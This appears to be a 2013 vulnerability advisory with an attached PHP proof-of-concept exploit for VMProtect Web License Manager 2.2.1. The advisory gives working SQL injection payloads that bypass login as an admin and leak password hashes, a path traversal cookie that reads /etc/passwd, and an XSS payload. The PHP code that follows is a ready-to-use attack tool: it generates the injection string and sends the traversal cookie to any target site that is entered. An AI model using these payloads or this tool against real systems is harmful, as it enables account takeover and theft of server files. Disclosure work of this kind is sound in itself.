/**
VMProtect Web License Manager 2.2.1 Multiple vulnerabilities
------------------------------------------------------------
		Vendor site: http://vmpsoft.com/

		First contact............: 11/09/2013
		Vendor answer............: 12/09/2013
		Vendor fixed the RFI/XSS.: 08/11/2013
		Second contact for SQL...: 25/11/2013
		Vendor fixed the SQL.....: 30/11/2013
		PoC Public release.......: 12/12/2013

	File
	----
		./inc/dbopen.inc.php
	
	What&#039;s wrong?
	-------------
		This function file works with MySQL databases.
		A function named &#039;Sql&#039; (line 13) sanitize an input passed in argument.
		If yes, it return it without any further checks.
		If not, it clear the input with &#039;mysql_real_escape_string&#039;.
		So, every input cleared with &#039;Sql&#039; is vulnerable to SQL Injection attacks.
	
	File
	----
		./login.php
	
	What&#039;s wrong?
	-------------
		Since dbopen.inc.php&#039;s function &#039;Sql&#039; is vulnerable...
		
		$sql = "SELECT * FROM {$DB_PREFIX}users WHERE login=" . Sql($_POST["login"]);
		
		Yup! This is really good. From this, we can do a lot of things, like get the
		password of an user, or get authenticated as an unregistred user.
		We will authenticated as anyone with an &#039;UNION SELECT&#039; query.
		The &#039;password&#039; field of &#039;users&#039; database is a SHA-1 hash of the password.
		
		The query would like this...
		
		=> SELECT * FROM vmp_users WHERE login=NULL UNION SELECT 1, 2, 3, 4, 5, 6
		
		1 => id
		2 => login
		3 => SHA1(password)
		4 => email
		5 => isadmin  (1 for admin, 0 for manager)
		6 => failures (anti password bruteforcing)
		
		To inject this query, just use the trick saw before:
		
		=> exp:NULL UNION SELECT 1, 2, 3, 4, 5, 6
		
		Fill each inputs with correct values, and get authenticated!
		
		Example for:
			id       => 1337
			login    => f4g
			password => f4g
			email    => f4g@tapz.eu
			isadmin  => 1
			failures => 0
		
		Login    => exp:NULL UNION SELECT 1337, 0x663467, SHA1(0x663467), 0x663467407461707a2e6575, 1, 0
		Password => f4g
		
		You can also know the hashed password of an user:
		
		exp:NULL UNION SELECT 1337, login, SHA1(0x663467), password, 5, 6 FROM vmp_users LIMIT 0, 1
		
		The username of the (fake) user is the user&#039;s name and the mail is the password...
		You can see it in the top-right corner.
		This vulnerability was found by having the source code.
		The demo panel on the official site was also vulnerable.

	File
	----
		./index.php
	
	What&#039;s wrong?
	-------------
		The cookie &#039;lang&#039; isn&#039;t correctly sanitised and lead to Remote file include attacks
		Cookie input lang was set to ../../../../../../../../../../etc/passwd%00
		File contents found: root:x:0:0:root:/root:/bin/bash
		This vulnerability was found without having the source code but was tested on many panels.
		The demo panel on the official site was also vulnerable.

	File
	----
		./offline.php
	
	What&#039;s wrong?
	-------------
		Imput &#039;url&#039; isn&#039;t correctly sanitised and lead to Cross-site scripting attacks:
		Payload: </textarea><script>prompt(1337)</script>
		This vulnerability was found without having the source code but was tested on many panels.
		The demo panel on the official site was also vulnerable.

	Solution
	--------
		Upgrade to newest version.

	Thanks
	------
		VMProtect team, Xartrick
		*/
?>
<style>
	label {
		display: block;
		width:   100px;
		float:   left;
	}
</style>

<form method="POST">
	<label for="id">Id:</label>             <input name="id"       id="id"       type="number"   value="1337" />       <br />
	<label for="login">Login:</label>       <input name="login"    id="login"    type="textbox"  value="f4g" />        <br />
	<label for="password">Password:</label> <input name="password" id="password" type="password" value="f4g" />        <br />
	<label for="email">Email:</label>       <input name="email"    id="email"    type="email"    value="f4g@tapz.eu" /><br />
	<label for="isadmin">Admin:</label>     <input name="isadmin"  id="isadmin"  type="checkbox" checked="true" />     <br />
	                                        <input type="submit" value="Send" />
</form>

<form method="POST">
	<label for="website">Website:</label> <input name="website" id="website" type="textbox" value="" />                          <br />
	<label for="file">File:</label>       <input name="file"    id="file"    type="textbox" value="../../../../../../../../../../windows/win.ini" /><br />
	                                      <input type="submit" value="Get" />
</form> 

<?php
	$input_user = array(&#039;id&#039;, &#039;login&#039;, &#039;password&#039;, &#039;email&#039;);
	$input_file = array(&#039;website&#039;, &#039;file&#039;);
	
	if (checkInput($input_user)) {
		$id       = intval($_POST[&#039;id&#039;]);
		$login    = $_POST[&#039;login&#039;];
		$password = $_POST[&#039;password&#039;];
		$email    = $_POST[&#039;email&#039;];
		$isAdmin  = isset($_POST[&#039;isadmin&#039;]);
		
		$query  = &#039;exp:NULL UNION SELECT &#039;;
		$query .= $id                                 . &#039;, &#039;;  // id
		$query .= &#039;0x&#039; . stringToHex($login)          . &#039;, &#039;;  // login
		$query .= &#039;SHA1(0x&#039; . stringToHex($password)  . &#039;), &#039;; // password
		$query .= &#039;0x&#039; . stringToHex($email)          . &#039;, &#039;;  // email
		$query .= (($isAdmin) ? &#039;1&#039; : &#039;0&#039;)            . &#039;, &#039;;  // isadmin
		$query .= &#039;0&#039;;                                         // failures
?>
<br />

<form>
	<label for="login">Login:</label>       <input name="login"    type="textbox" value="<?php echo($query); ?>" /><br />
	<label for="password">Password:</label> <input name="password" type="textbox" value="<?php echo(htmlentities($password, ENT_QUOTES)); ?>" />
</form>
<?php
	}
	
	if (checkInput($input_file)) {
		if (filter_var($_POST[&#039;website&#039;], FILTER_VALIDATE_URL)) {
			$curl = curl_init($_POST[&#039;website&#039;] . &#039;include/lang.inc.php&#039;);
			
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($curl, CURLOPT_HEADER, false);
			curl_setopt($curl, CURLOPT_COOKIE, &#039;lang=&#039; . urlencode($_POST[&#039;file&#039;] . chr(0)) . &#039;;&#039;);
			
			$page = curl_exec($curl);
?>
<textarea rows="20" cols="100" disabled="disabled" wrap="off"><?php echo($page); ?></textarea>
<?php			
		}
	}
	
	function stringToHex($str) {
		$hex = null;
		
		for ($i = 0; $i < strlen($str); $i++)
			$hex .= str_pad(dechex(ord($str[$i])), 2, &#039;0&#039;, STR_PAD_LEFT);
		
		return $hex;
	}
	
	function checkInput($inputs) {
		global $_POST;
		
		foreach ($inputs as $input) {
			if (!isset($_POST[$input]))
				return false;
			
			if (is_array($_POST[$input]))
				return false;
			
			if ($_POST[$input] == &#039;&#039;)
				return false;
		}
		
		return true;
	}
?>

